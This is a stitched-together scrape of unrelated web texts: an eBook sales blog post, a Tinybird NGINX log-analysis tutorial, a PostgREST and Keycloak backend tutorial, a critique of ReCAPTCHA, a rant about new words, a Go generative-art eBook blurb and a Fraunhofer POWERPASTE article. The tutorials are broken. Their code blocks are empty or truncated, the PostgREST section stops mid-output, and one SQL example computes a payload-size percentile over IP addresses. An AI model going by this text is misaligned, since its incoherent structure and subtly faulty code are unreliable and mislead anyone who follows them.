<p>One of the bits of feedback I got on the eBook was how users enjoyed the use-cases, and practical examples. I'd recently started video streaming, so invited a friend to my YouTube channel to talk about serverless use-cases.</p>
<p><img src="https://camo.githubusercontent.com/544dffaf339a4ff44439db1c14cd953de385640b99231688f8a49db61294a02e/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f457378444745505841415968724c4f3f666f726d61743d6a7067266e616d653d6c61726765" alt="Video on use-cases"></p>
<p><a href="https://www.youtube.com/watch?v=mzuXVuccaqI&amp;feature=youtu.be">Watch the recording</a></p>
<p>The recording generated a lot of interest and engagement for existing eBook customers, but no additional sales.</p>
<p>You can get the <a href="https://gist.github.com/alexellis/c72d7a385f801cc9b8deb7fcaa531b69">show notes</a> here which have lots of links for use-cases from hobbyists, indie devs and corporate users of OpenFaaS.</p>
<h2 id="mynextmilestone">My next milestone</h2>
<p>I am pleased with the results so far, and have learned a lot along the way. I also had a few people reach out to me directly asking for help who had taken inspiration from seeing someone actually go ahead and take a calculated risk.</p>
<p>I haven't quite got to 10k USD, which is a nice round number to aim for, but I can roughly understand what each peak means here, and whether they are repeatable.</p>
<p><img src="https://pbs.twimg.com/media/EtARGclXMAg7nJ-?format=jpg&amp;name=medium" alt="Approaching 10k"></p>
<p>Once the sales do cross that threshold, I'll write-up a how to guide and share the command lines and tools I used to generate the eBook.</p>
<h2 id="whatsnext">What's next</h2>
<p>I committed to providing free updates - because the eBook was partially experimental and I wanted to validate that it was useful. Using the <a href="https://slack.openfaas.io/">OpenFaaS Slack</a> helped here - I opened a new channel for people who'd bought the book, and enjoyed the feedback and engagement from this.</p>
<p>Some people charge extra for community, but it felt too hard to enforce the access for this.</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810333-b628f280-57eb-11eb-8be9-a2f6c773346b.png" alt="Original cover"></p>
<p>I generated my own eBook cover originally and then only later, got a professional designer involved.</p>
<p><img src="https://static-2.gumroad.com/res/gumroad/2028406193591/asset_previews/741f2ad46ff0a08e16aaf48d21810ba7/retina/social4.png" alt="New design"></p>
<p>It turns out that the cover may not matter with Gumroad, as long as it's not awful. Since changing cover, I've only seen two new sales.</p>
<p>Now that I have some initial feedback and have learned that people will buy things from me, I want to let goodwill rebuild, and my audience "recover" before launching a second eBook. I've done a lot of free blog posts and writing on Kubernetes, Docker, Golang and Raspberry Pi and analytics from my blog shows me what's popular.</p>
<blockquote>
<p>In 14 days, I've received more money than OpenFaaS corporate users have paid into the project over 4 years.</p>
</blockquote>
<p>Just because something you give away for free is popular, doesn't mean that anyone will be willing to pay for it. OpenFaaS itself is testament to that, with many corporations using it in production, without contributing code or finances back.</p>
<p>The Right It has taught me not to invest too much effort up front in any one idea - as it's likely to fail. Instead I'll be testing ideas - getting feedback by investing a few hours or days, not weeks.</p>
<p>I am sure I've missed out lots of details here, so feel free to ask me questions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <div> <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div id="post-content" itemprop="articleBody"> <p>While Tinybird is not a log analysis tool per se, it’s a tool that you can use as the foundation to analyze logs-like datasets at scale. Here you’ll learn:</p> <ul> <li>how to use it to analyze NGINX logs</li> <li>how to publish your SQL queries as API endpoints to be used in other tools</li> <li>and how to model your data sources and endpoints to make it 10X faster.</li> </ul> <p>An NGINX log looks like this:</p>  <p>It’s not a CSV file but a “space separated file” so in principle Tinybird wouldn’t load it because we just support CSV files. But if we analyze the file using our <a href="https://docs.tinybird.co/cli.html">CLI tool</a>:</p>  <p>The delimiter is guessed so it can be loaded.</p>  <p>The format looks like this:</p>  <p>We need to transform it to something useful. To transform data we use a pipe.</p>  <p>Now let’s query the new pipe:</p>  <p>You could now publish an endpoint:</p>  <p>So far so good. But what happens when you have millions of entries a day, the generated endpoints wouldn’t be as fast as needed. For example, for endpoints serving real time dashboards, where the user can pick different date ranges, add filters and so on, waiting for more than a second is not the best solution. So there is an easy solution: generate views as data arrives.</p> <p>So, let’s create a Materialized view (MV from now on) for the previous endpoint:</p>  <p>There are many things to notice:</p> <ul> <li>The materialized view SQL is almost the same than the endpoint but instead of count it uses countState and the same for avg. Those -State modifiers are needed when pushing data to a MV. The datasource where the MV pushes the data has two columns with a special data type to store those <code>-State</code></li> <li>The Engine is not the regular MergeTree, it’s an <code>AggregatingMergeTree</code> that tells ClickHouse to aggregate columns on merge operations (executed periodically, you don’t need to worry about that)</li> <li>The sorting key tells ClickHouse which column we are grouping by</li> </ul> <p>We push the files</p>  <p>We use <code>--push-deps</code> to upload all the dependencies and <code>--populate</code> to fill the materialized view with the data already in <code>log_transform</code></p> <p>Now we check the amount of rows in that table:</p>  <p>If we push new data with new IP addresses, the amount of rows will rise but, comparing the amount of rows in the original table with the MV datasource, you can understand why it is going to be faster. And the good thing - this table is updated when you push new data, it does not need to be recalculated.</p>  <p>The last thing is to change the endpoint to use the new table</p>   <p>Let’s test the endpoint and compare with the old one</p>  <p>Both are really fast but the last one is one order of magnitude faster.</p> <p>You could create MV for any case you can think of, for example:</p> <ul> <li>unique ip addreeses by day: <code>select toDate(time) day, uniqState(ip_address) uniq_ip from log_transform group by day</code></li> <li>percentile 95 of payload size per hour: <code>select toStartOfHour(time) hour, quantileState(0.95)(ip_address) q95 from log_transform group by hour</code></li> <li>requests per month: <code>select toStartOfMonth(time) month, countState() requests_count from log_transform group by month</code></li> </ul> <p>Materialized views are a really powerful feature specially when you are creating real time endpoints.</p> <p>We created a <a href="https://github.com/tinybirdco/log_parsing_template">github repo</a> with the data project so you can reproduce the post commands in your Tinybird account and start analysing your own logs.</p> </div>  </article>  </div> </div></div>]]>

        <p><em>Most of the time, a backend is just a layer between APIs and a database. Using the Postgrest project and
                some SQL we will build a backend without any Java, Golang, C# etc…</em></p>
        <p><em>For this Demo, we will build a chat application with channels, messages, users and user profiles.</em>
        </p>
        <p><code>March 02,2020</code></p>
        <h2 id="firstadatabase">First, a database</h2>
        <p>Database, an essential tool for every project on the web. Relationnal databases are not new… almost 50 years
            !
            <a href="https://en.wikipedia.org/wiki/Relational_database">https://en.wikipedia.org/wiki/Relational_database</a>
        </p>
        <p>With stored procedures, views, user management, roles and a query langage we all know we can do whatever we
            want on our data. With frameworks, ORM and other tools that makes great integration between Object langages
            and Relational Databases we spend most of time using them to access data in a simple way, so simple that we
            can do directly with SQL.</p>
        <p><a href="https://www.postgresql.org/">https://www.postgresql.org/</a> is a very popular open source database
            system, so let's go with it.</p>
        <p>Now our docker-compose file starts with : </p>
        <pre><code>version: '3'
        services:
          db:
            image: postgres
            ports:
              - "5432:5432"
            environment:
              POSTGRES_PASSWORD: password
        </code></pre>
        <h2 id="anauthenticationserverkeycloakwithpleaseopenit">An authentication server : keycloak with please-open.it
        </h2>
        <p>Go to <a href="https://console.please-open.it/">https://console.please-open.it</a> and subscribe to a free
            keycloak realm. It is the easiest way to start.</p>
        <p>This realm will provide JWT tokens we need to authenticate users on our DB. JWT tokens are signed with a
            private key. We need to retreive a public key in order to verify token signature.
            Go to "realm settings", "keys", and get the public key for RSA RS256 algorithm.</p>
        <p><img src="https://www.mathieupassenaud.fr/codeless_backend/_Codeless_%20backend_files/public_key.png" alt="public_key"></p>
        <p>This key is in PEM format. For postgrest, we need it in JWK.
            A simple tool online can do it for you : <a href="https://8gwifi.org/jwkconvertfunctions.jsp">https://8gwifi.org/jwkconvertfunctions.jsp</a></p>
        <p>Add "-----BEGIN PUBLIC KEY-----" and "-----END PUBLIC KEY-----" delimiters, paste your key and transform it
            to JWK.</p>
        <p><img src="https://www.mathieupassenaud.fr/codeless_backend/_Codeless_%20backend_files/pem_to_jwk.png" alt="pem to jwk"></p>
        <h3 id="createaclient">Create a client</h3>
        <p>A client for a web frontend is needed, to get an access<em>token after login. Go to "clients" and create a
                new one. This client in this example is named "frontend". Choose access type "public", and define the
                redirect</em>uri to "https://playground.please-open.it/" for now.</p>
        <p><img src="https://www.mathieupassenaud.fr/codeless_backend/_Codeless_%20backend_files/new_client.png" alt="new client"></p>
        <h3 id="roles">Roles</h3>
        <p>Go to "roles" tab in the client, we need only 2 roles : standard and admin. Create them, after we will
            associate to users.
            <img src="https://www.mathieupassenaud.fr/codeless_backend/_Codeless_%20backend_files/roles.png" alt="roles"></p>
        <h3 id="users">Users</h3>
        <p>2 users "standard" and 1 "admin". </p>
        <p>After creating a user, remove all "required user actions", go to "credentials" and attribute a new password.
            In "Role Mappings", select your client "frontend" and add a "standard", or "admin" role.</p>
        <p><img src="https://www.mathieupassenaud.fr/codeless_backend/_Codeless_%20backend_files/role_mapping.png" alt="add roles"></p>
        <h3 id="webapplication">Web application</h3>
        <p>The easiest way to obtain a token, is your (playground)[https://playground.please-open.it]. An opensource web
            application, oauth2 client for keycloak and token introspection.
            In "parameters", put your realm id and client id. Now we are ready to retreive a new token. Click on
            "login", enter a user credentials and the redirect will do the job.</p>
        <p><img src="https://www.mathieupassenaud.fr/codeless_backend/_Codeless_%20backend_files/login.png" alt="login"></p>
        <p>An access_token is retreived and decoded. The base64 encoded will be used later, in each api call.</p>
        <h2 id="restapispostgrest">REST APIs : postgrest</h2>
        <p><a href="https://en.wikipedia.org/wiki/Representational_state_transfer">https://en.wikipedia.org/wiki/Representational<em>state</em>transfer</a>
        </p>
        <p><a href="http://postgrest.org/en/v6.0/">Postgrest</a> is a standalone app with a web server, turning a
            database directly into a RESTful API. Sometimes the only way we are using ORM for.</p>
        <h3 id="authentication">Authentication</h3>
        <p>Authentication is ensured by JWT tokens. Postgrest verifies the signature with the given key (using
            "PGRST<em>JWT</em>SECRET" variable), then get a role in the token's payload.</p>
        <p>In order to verify the signature, a public key is needed. Retreive the JWK you have generated previously and
            paste is ENTIERLY in the "PGRST<em>JWT</em>SECRET" variable.</p>
        <h3 id="anonymousrole">Anonymous role</h3>
        <p>An anonymous role gives access to data without any authentication. We gives to postgrest a name of an
            anonymous role. By using this, all resources granted to this role will be accessible without a token.</p>
        <p>PGRST<em>DB</em>ANON<em>ROLE: web</em>anon</p>
        <h3 id="rolesclaimkey">Roles claim key</h3>
        <p>JWT tokens from keycloak looks like this : </p>

            "preferred_username": "todo_user"
        }
        </code></pre>
        <p>"sub" is the user id, we need it later to link data to user.
            "email" is also interesting.</p>
        <p>Now, let's check the role of "frontend" client. The path is : resource_access.frontend.role at index 0.</p>
        <p>So, we have the representation in the "PGRST<em>ROLE</em>CLAIM<em>KEY" : PGRST</em>ROLE<em>CLAIM</em>KEY:
            '.resource_access.frontend.roles[0]'</p>
        <p>Enrich the docker-compose with this component : </p>

        <pre><code>docker exec -it postgrest_db_1 psql -U postgres

        </code></pre>
        <p>Ok, now we have an empty database with a schema to expose as REST api.</p>
        <p>Create a table for an example : </p>
        <pre><code>CREATE TABLE api.roles_example (
          uuid    UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
          message_time    TIMESTAMP NOT NULL DEFAULT now(),
          message_body    TEXT
        );
        </code></pre>
        <p>This table is exposed as a REST api.
            Create a role web_anon, defined as an anonymous role. Giving only access to schema permit API description in
            swagger.</p>
        <pre><code>CREATE ROLE web_anon NOLOGIN;
        GRANT USAGE ON SCHEMA api TO web_anon;
        grant select on api.roles_example to web_anon;
        </code></pre>
        <p>Go to <a href="http://localhost:3000/">http://localhost:3000</a> and voilà ! This is a description for
            swagger.</p>
        <p>Go to <a href="https://swagger.io/tools/swagger-ui/">https://swagger.io/tools/swagger-ui/</a> and open "Live
            Demo". Enter your API URI http://localhost:3000 in the field and click on "explore".</p>
        <p>GET request is authorized without an access<em>token, due to "web</em>anon" role. </p>
        <p><img src="https://www.mathieupassenaud.fr/codeless_backend/_Codeless_%20backend_files/select.png" alt="Select"></p>
        <p>Only select is permitted on web_anon.</p>
        <p>Now we register a new role "standard" which corresponds to the role we created previously in keycloak.
            With the configuration, postgrest will check in JWT token at resource<em>access.frontend.roles[0] value is
                "standard".
                This role will gives all access on api.roles</em>example table : </p>
        <pre><code>CREATE ROLE standard NOLOGIN;
        GRANT USAGE ON SCHEMA api TO standard;
        GRANT ALL ON api.roles_example TO standard;
        </code></pre>
        <p>Retreive an access_token from playground, and use it in "Authorization" header.</p>
        <p>Now, we can create a new entry in db : </p>
        <pre><code>curl --location --request POST 'http://127.0.0.1:3000/roles_example' \
        --header 'Authorization: Bearer e...6Q' \
        --header 'Content-Type: application/json' \
        --data-raw '{"message_body": "learn how to auth"}'
        </code></pre>
        <p>The entry is created : </p>
        <pre><code>example=# select * from api.roles_example;
                         uuid                 |       message_time        |   message_body

<p>Google’s <a href="https://en.wikipedia.org/wiki/ReCAPTCHA">ReCAPTCHA</a> is often the first tool that many webmasters reach for when confronted with the need to stop spam and automated malicious traffic from harming their services. In this post I explain several reasons why ReCAPTCHA is usually not the best solution to use for this purpose, as it is often unnecessary, inconveniences users, and subjects users to intensive tracking and fingerprinting that they are not able to opt-out of. Several alternative solutions to ReCAPTCHA for various threat models are presented as well as best practices for implementing captchas in general. <br></p>



<div><figure><img loading="lazy" width="436" height="119" src="https://nearcyan.com/wp-content/uploads/2019/06/recaptcha.png" alt="" srcset="https://nearcyan.com/wp-content/uploads/2019/06/recaptcha.png 436w, https://nearcyan.com/wp-content/uploads/2019/06/recaptcha-300x82.png 300w" sizes="(max-width: 436px) 100vw, 436px"><figcaption>The face of evil</figcaption></figure></div>







<p>ReCAPTCHA is yet another free-of-charge product offered benevolently by Google for any webmaster to implement within their own services. How does ReCAPTCHA differentiate legitimate human users from bots? ReCAPTCHA relies extensively on user fingerprinting, putting emphasis on the question of “Which human is this user?” rather than the ordinary “Is this user human?”. It’s worth noting how much easier it is to successfully solve ReCAPTCHAs when the user is logged into their Google account, thus allowing Google to associate their actions with their real identity. A <a href="https://old.reddit.com/r/firefox/comments/9vmsyp/google_recaptchas_targeting_firefox_and_other/">similar effect</a> is <a href="https://news.ycombinator.com/item?id=20147015">often reported</a> for users of non-Google browsers, who notice ReCAPTCHAs take more time to complete in Firefox over Chrome. This is in-line with <a href="https://wccftech.com/former-mozilla-vp-says-google-intentionally-damaged-firefox/">many other anti-competitive techniques</a> that Google has used over the years to help grow their market share.</p>



<p>Although determining
exactly how ReCAPTCHA works is very difficult, with Google not only
heavily obfuscating its JavaScript, but also implementing an entire
VM in JavaScript with its own bytecode language, there have still
been many attempts to reverse-engineer some of the client-side code,
as well as to theorize about how the server-side logic operates.
<a href="https://github.com/toogle/InsideReCaptcha">Initial attempts</a>
at reverse-engineering ReCAPTCHA show copious amounts of information
belong collected, including but not limited to: plugins, user agent,
IP address, screen resolution, execution times, timezone, language,
click/keyboard/touch information within the frame of the captcha,
test results of many browser-specific functions and CSS evaluation,
information about canvas element rendering, and cookies, including
those affiliated with your Google account that were placed within the
last 6 months.</p>



<p>There is a good reason why ReCAPTCHA uses the google.com domain instead of one specific to ReCAPTCHA. This allows Google to receive any cookies that they have already set for you, effectively bypassing restrictions on setting third party cookies and allowing traffic correlation with all of Google’s other services, which most users use. ReCAPTCHA collects enough information that it could reliably de-anonymize many users that simply wish to prove that they are Not A Robot. As JavaScript is now required to even view a ReCAPTCHA, even a user running software such as TBB (Tor Browser Bundle) may find themselves giving away more information than they intend to, for example if they have resized their browser window (which is discouraged for exactly this reason).</p>



<p>Correspondingly, webmasters that use Google’s ReCAPTCHA on their websites must link to both Google’s <a href="https://policies.google.com/privacy?hl=en">Privacy</a> and <a href="https://policies.google.com/terms?hl=en">Terms</a> pages (included in the form by default in a small 8px style that makes them appear unclickable). Although Google used to have its own privacy and terms pages for ReCAPTCHA, these links are no longer specific to ReCAPTCHA, but rather are the privacy and terms pages for all users of Google services in general, regardless of which service is being used, or if the user has (or even wants) a Google account to begin with. Therefore accepting these terms (implicitly, by attempting to prove you are Not A Robot) grants Google permission to do <strong>everything</strong> that they do to their regular users of their services to you, and little information is available as to what specifically is done (GDPR is likely to be unhelpful here, given ReCAPTCHA’s spam-stopping purpose). Not only are the unhelpful links in the ReCAPTCHA box never opened by users, but there is also no Google logo or visual reference to indicate that ReCAPTCHA is a Google service, so many users have zero indication that they have just consented to all of Google’s tracking just because they tried to leave feedback or create a ticket on your website. If you thought you could use the Internet without using Google’s services, try using the Internet without filling out a single ReCAPTCHA, which for some users is required to pay their bills, file their taxes, and sometimes even use Government websites (if you somehow manage this, next try never sending email to Gmail/Gsuite addresses or using Google APIs for a more exciting challenge). Good luck.</p>



<p>It is worth mentioning that caring about user privacy to this extent is likely to be outside of the scope of concern for most websites. Many websites are already so tightly coupled to Google’s services (commonly including Google analytics, Google ads, Google APIs, Google tag manager, Google static resources, Google OAuth, Google Compute Engine, and many others) that the addition of a Google captcha appears negligible. With that said, different websites have different values and different users, and many do not want to require users to agree to Google’s tracking and labor for basic usage. The level of centralization that ReCAPTCHA forces is not good for anyone except Google.</p>



<p>Apart from the privacy implications of ReCAPTCHA usage, the actual captcha is very tedious for many classes of users, sometimes becoming so difficult that users find themselves unable to to complete the captcha at all. <a href="https://github.com/google/recaptcha/issues/286">Users hate ReCAPTCHA</a>. <a href="https://www.reddit.com/r/rant/comments/8yezeq/fuck_recaptcha/">They</a> <a href="https://devrant.com/rants/1754031/fuck-recaptcha-fuck-google-for-making-recaptcha-fuck-it-dont-be-evil-my-foot">really</a> <a href="https://www.neogaf.com/threads/the-select-all-images-with-a-street-sign-recaptcha-is-a-godless-creation-of-evil.1410504/">hate</a> <a href="https://news.ycombinator.com/item?id=19059390">ReCAPTCHA</a>. <a href="https://recaptcha.sucks/">ReCAPTCHA</a> <a href="https://strugee.net/blog/2019/04/make-recaptchas-im-not-a-robot-accurate">is</a> <a href="https://uxdesign.cc/recaptcha-is-uxs-worst-nightmare-c28b7341e88a">so</a> <a href="https://www.reddit.com/r/unpopularopinion/comments/9haexn/googles_recaptcha_needs_to_be_fucking_made_illegal/">hated</a> that <a href="https://www.4chan.org/pass">some websites</a> have a profit model of charging users $20 annually to disable ReCAPTCHA, which <strong>thousands </strong>of users pay for. If this sounds like a great new business model to you and now you want to add ReCAPTCHAs to every page of your website to attempt to maximize profit, I will find you. And I will force you to complete a ReCAPTCHA every time you want food or water until you die from malnutrition after the first week. I have read countless posts from users that became so frustrated with a service that used excessive ReCAPTCHAs that they swore to never use the offending website again. These are often intelligent users with <a href="https://www.w3.org/TR/turingtest/#version-2-are-you-a-robot">no disabilities</a> who are simply tired of being treated like dirt and wasting their time. Be kind to your users and help minimize the amount of ReCAPTCHAS that they have to solve just to be allowed to use the Internet.</p>



<p>ReCAPTCHAs become significantly more difficult if the user attempts to ‘opt-out’ of Google’s services and tracking by using software that hinders it, such as VPNs, TBB, and many anti-tracking browser addons and modifications. To demonstrate what is meant by ‘very tedious’, below is a real-time recording of myself solving a single ReCAPTCHA using TBB:</p>



<figure><video controls="" src="https://nearcyan.com/wp-content/uploads/2019/06/recaptcha-1.webm"></video><figcaption>Spambots are known to give up when forced to be patient</figcaption></figure>



<p>I got lucky and only needed to complete two challenges. Sometimes there are ten or more. Watching the above video, you might think to yourself “I knew the tor network was slow, but I didn’t know it was <em>that</em> slow!”. You would be correct to take note of this discrepancy. If we open up the web developer console, we can see that the HTTP requests for new captcha images only take a few hundred milliseconds. Despite this, Google’s heavily-obfuscated JavaScript intentionally delays the appearance of the new images by several seconds every time, which I’m sure has something to do with the fact that bots give up when forced to wait, probably. This is not a nice way to treat users that don’t want to perform unpaid labor and be fingerprinted by Google. Keep in mind that the above video demonstrates one of the worst possible cases of ReCAPTCHA UX (which some <a href="https://greasyfork.org/en/scripts/31088-morecaptcha/code">userscripts</a> may improve), and that the average user has a significantly quicker experience, providing that they are not attempting to thwart any of Google’s tracking and don’t make many mistakes.</p>



<p>In addition to this tediousness, the actual labor that the user is performing is directly used to benefit Google. Worry not however, as Google is eager to brag about the selfless humanitarianism that you’re engaging in by choosing ReCAPTCHA, stating the following on their main ReCAPTCHA <a href="https://developers.google.com/recaptcha/">page</a>:</p>



<blockquote><p>“Hundreds of millions of captchas are solved by people every day. ReCAPTCHA makes positive use of this human effort by channeling the time spent solving captchas into digitizing text, annotating images, building machine learning datasets.”</p></blockquote>



<p>This
is certainly a very rosy way of convincing
you to feel good about forcing
your users to engage in unpaid labor that directly benefits the
world’s most powerful surveillance corporation. ReCAPTCHA
is free for a reason.</p>



<p>Lastly, ReCAPTCHA is popular. Very popular. While this brings some advantages, it also means that there’s significant efforts to break ReCAPTCHA, and those efforts all potentially affect your website, with your captcha implementation being perfectly identical to a million others. As a result of this, there have been <a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Sivakorn-Im-Not-a-Human-Breaking-the-Google-reCAPTCHA-wp.pdf">many</a> <a href="https://www.lancaster.ac.uk/staff/wangz3/publications/ccs18.pdf">papers</a> <a href="https://uncaptcha.cs.umd.edu/papers/uncaptcha_woot17.pdf">published</a> <a href="https://github.com/ecthros/uncaptcha">that</a> <a href="https://github.com/ecthros/uncaptcha2">break</a> <a href="https://science.sciencemag.org/content/358/6368/eaag2612">ReCAPTCHA</a> over the years, generally with Google making modifications to improve their captcha afterwards. There have also been <a href="https://2captcha.com/">paid-for</a> <a href="https://www.deathbycaptcha.com/">services</a> that use human labor to solve captchas on behalf of a paying client for less than a cent each. For a modern and user-friendly example of bypassing ReCAPTCHA, see Buster. <a href="https://github.com/dessant/buster">Buster</a> is a modern browser extension (Firefox+Chrome+Opera) which helps you to solve difficult captchas by completing reCAPTCHA audio challenges for you by using speech recognition.</p>











<p>Before implementing a captcha, it’s worth considering if one is
necessary to begin with. To help with evaluating this proposition,
consider if your threat model is concerned over <em>customized</em> or
<em>uncustomized</em> spam. Uncustomized spam is pervasive across many
Internet protocols, and you will encounter it quickly after enabling
HTTP, SSH, or …</p></div></div>

<p><span>By Grant Ainsley | Tips | [comments] | Posted &nbsp;[date]</span></p>
<hr>
<h2>The Second Edition of the 20-volume Oxford Dictionary says there are 171,476 words in use in the English language and adds there are 47,156 words considered obsolete. A vocabulary of just 3,000 words will cover 95% of the words anyone needs to use. <br></h2>

<p>I have a simple question then - why do we need to invent new words?<br></p>

<blockquote>
<p>This blog is somewhat of a rant against inventing new words and taking perfectly good longer words and coming up with shorter, catchy versions. Stop doing it.</p>
</blockquote>
<h3>What is a Lifehack?</h3>
<p>Have you ever wondered where new words come from? We go through life and use all the words we need in certain situations and seemingly all of a sudden, we keep seeing and hearing new words being used in place of old ones.</p>

<p>Exhibit #1 is the use of the word “hacks”. I’ve wondered for the last year where the term came from? I’ve been seeing it everywhere, including from many of my counterparts. It seemed to have replaced “tips” or “strategies”, which, by the way, are perfectly fine words and don’t need to be replaced.</p>

<p>In the past, when the term hack was used, it wasn’t good. Less skilled hockey players or golfers have been called hacks. When somebody gets “hacked” it’s not a good thing. Mind you, if “being hacked” is just an excuse to cover up some embarrassing social media behavior, then I guess it is a positive.</p>

<p>I’ve also seen the term “lifehacks” appear and although I wasn’t totally sure, it seems lifehacks are tips or strategies to make your life better in some way. I was just guessing though because I must have missed the memo explaining what lifehacks really means.</p>

<p>How do these words get suddenly appear and used? Does a group of people, like a committee, sit in a room somewhere and approve these words for general use?</p>

<h3>Wiki Wins</h3>
<p>I went to the authority on everything – Wikipedia, and got the answer.&nbsp; Here’s what Wiki says about hacks:</p>
<p><em>Life hack (or life hacking) refers to any trick, shortcut, skill, or novelty method that increases productivity and efficiency, in all walks of life. The term was primarily used by computer experts who suffer from information overload, or those with a playful curiosity in the ways they can accelerate their workflow in ways other than programming.</em></p>

<p>Wiki was good enough to even tell me how this word came into existence:</p>
<p><em>The term life hack was coined in 2004 during the O’Rieilly Emerging Technology Conference in San Diego, California by technology journalist Danny O’Brien to describe the "embarrassing" scripts and shortcuts productive IT professionals use to get their work done. After his presentation, use of the term life hack spread in the tech and blogging community.</em></p>

<p><em>The American Dialect Society voted lifehack (one word) as the runner-up for "most useful word of 2005" behind podcast. The word was also added to the Oxford Dictionaries Online in June 2011.</em></p>

<p>Excuse me? Lifehack got voted the second most useful word over a decade ago? I must have missed that story. Lifehacks in now in the Oxford Dictionary? Can I demand a recount?</p>

<h3>Evil Cousins to Real Words</h3>
<p>While I’m at it, I would like to demand people stop making up words that are abbreviations for longer words that, once again, are perfectly fine and have been used for years.</p>

<p>Apparently, you no longer make reservations at restaurants or other places. You now make “resos”.</p>
<p>You don’t order appetizers, you order “appies”</p>
<p>They are no longer called journalists because they’re now “journos”.</p>
<p>You don’t have a conversation, you have a “convo”.</p>
<p>You don’t go on a holiday anymore, you go on a “vacay”.</p>
<p>It’s no longer the May Long Weekend, it’s now “May Long”. If we wanted to be really accurate, it’s actually the Victoria Day Long weekend.</p>

<h3>Just Stop It!</h3>
<p>I know cute, shortened words and phrases are being used because the actual word is too long. Reservations, as an example, has four syllables. Have we got to the point now where we can’t use four syllable words? Does it take too long? Is this like using acronyms when you text like LOL? Is it too difficult for young people?</p>

<p>There. I’ve said it. It’s an age thing. These words are invented by younger people. I don’t want this to turn into an old guy rant, but I do wish people would stop inventing words to replace other perfectly good words I’ve used all my life.</p>

<p>It’s like going to a bakery to buy a loaf of bread and you ask for one and the clerk tells you it’s now called something else. When the hell did this happen? Who renamed it?</p>

<p>Perhaps Twitter, when you could only use 140 characters, had something to do with shorter words being used. Now that we have 280 characters on Twitter, can we go back to the full words please?</p>

<p>I’ve made a pledge never to use one of these words. Quite frankly I feel stupid just typing them.</p>

<p>Now get off my lawn!</p>

 <p>Generative Art in Go is a short eBook intended to introduce novice and experienced programmers to algorithmic art, and hopefully, get non-programmers interested in the <a href="https://golang.org/">Go programming language</a>. Unlike popular choices such as <a href="https://processing.org/">Processing</a>, <a href="https://www.nodebox.net/">NodeBox</a>, <a href="https://openframeworks.cc/">openFrameworks</a>, etc., I picked Go for two simple reasons:</p><ul><li>Go's syntax is easy enough that virtually anyone can learn it quickly.</li><li>The language is far more versatile than what most programmers use it for.</li></ul><p>Generative art is a unique form of artistic expression, building bridges between computer programming, randomness, and visual aesthetics. It has kept my imagination for over a decade. While I have never been particularly skilled at drawing, I have always been amazed by what one could achieve with a couple of lines of code.</p><p>This book will introduce readers to graphics programming in the Go programming language context through a series of concise examples. It will also guide them in implementing their version of one of my favorite generative art sketches. As a bonus, readers will learn how to turn their command-line sketches into interactive Web applications, using <a href="https://webassembly.org/">WebAssembly</a> and Web technology's latest standards.</p><p>Happy reading!</p>

		<p>Gasoline and diesel engines, which are powered by fossil fuels, will soon be sidelined by climate change. Instead, new propulsion systems will be required. One fuel with a big potential is hydrogen. Hydrogen vehicles are equipped with a reinforced tank that is fueled at a pressure of 700 bar. This tank feeds a fuel cell, which converts the hydrogen into electricity. This in turn drives an electric motor to propels the vehicle. In the case of passenger cars, this technology is well advanced, with several hundred hydrogen-powered automobiles already in operation on German roads. At the same time, the network of hydrogen stations in Germany is projected to grow from 100 to 400 over the next three years. Yet hydrogen is not currently an option for small vehicles such as electric scooters and motorcycles, since the pressure surge during refilling would be too great. Does this effectively shut out such vehicles from hydrogen technology?</p> 
<h4><b>POWERPASTE: the hydrogen technology for small vehicles</b></h4> 
<p>Not at all! Researchers from the Fraunhofer Institute for Manufacturing Technology and Advanced Materials IFAM in Dresden have now come up with a hydrogen-based fuel that is ideal for small vehicles: POWERPASTE, which is based on solid magnesium hydride. “POWERPASTE stores hydrogen in a chemical form at room temperature and atmospheric pressure to be then released on demand,” explains Dr. Marcus Vogt, research associate at Fraunhofer IFAM. And given that POWERPASTE only begins to decompose at temperatures of around 250 °C, it remains safe even when an e-scooter stands in the baking sun for hours. Moreover, refueling is extremely simple. Instead of heading to the filling station, riders merely have to replace an empty cartridge with a new one and then refill a tank with mains water. This can be done either at home or underway.</p> 
<p>The starting material of POWERPASTE is magnesium, one of the most abundant elements and, therefore, an easily available raw material. Magnesium powder is combined with hydrogen to form magnesium hydride in a process conducted at 350 °C and five to six times atmospheric pressure. An ester and a metal salt are then added in order to form the finished product. Onboard the vehicle, the POWERPASTE is released from a cartridge by means of a plunger. When water is added from an onboard tank, the ensuing reaction generates hydrogen gas in a quantity dynamically adjusted to the actual requirements of the fuel cell. In fact, only half of the hydrogen originates from the POWERPASTE; the rest comes from the added water. “POWERPASTE thus has a huge energy storage density,” says Vogt. “It is substantially higher than that of a 700 bar high-pressure tank. And compared to batteries, it has ten times the energy storage density.” This means that POWERPASTE offers a range comparable to – or even greater than – gasoline. And it also provides a higher range than compressed hydrogen at a pressure of 700 bar.</p> 
<h4><b>Suitable for e-scooters – and other applications as well</b></h4> 
<p>With its huge energy storage density, POWERPASTE is also an interesting option for cars, delivery vehicles and range extenders in battery-powered electric vehicles. Similarly, it could also significantly extend the flight time of large drones, which would thereby be able to fly for several hours rather than a mere 20 minutes. This would be especially useful for survey work, such as the inspection of forestry or power lines. In another kind of application, campers might also use POWERPASTE in a fuel cell to generate electricity to power a coffeemaker or toaster.</p> 
<h4><b>POWERPASTE helps overcome lack of infrastructure</b></h4> 
<p>In addition to providing a high operating range, POWERPASTE has another point in its favor. Unlike gaseous hydrogen, it does not require a costly infrastructure. This makes it ideal for areas lacking such an infrastructure. In places where there are no hydrogen stations, regular filling stations could therefore sell POWERPASTE in cartridges or canisters instead. The paste is fluid and pumpable. It can therefore be supplied by a standard filling line, using relatively inexpensive equipment. Initially, filling stations could supply smaller quantities of POWERPASTE – from a metal drum, for example – and then expand in line with demand. This would require capital expenditure of several tens of thousands of euros. By way of comparison, a filling station to pump hydrogen at high pressure currently costs between one and two million euros for each fuel pump. POWERPASTE is also cheap to transport, since no costly high-pressure tanks are involved nor the use of extremely cold liquid hydrogen.</p> 
<h4><b>Pilot center planned for 2021</b></h4> 
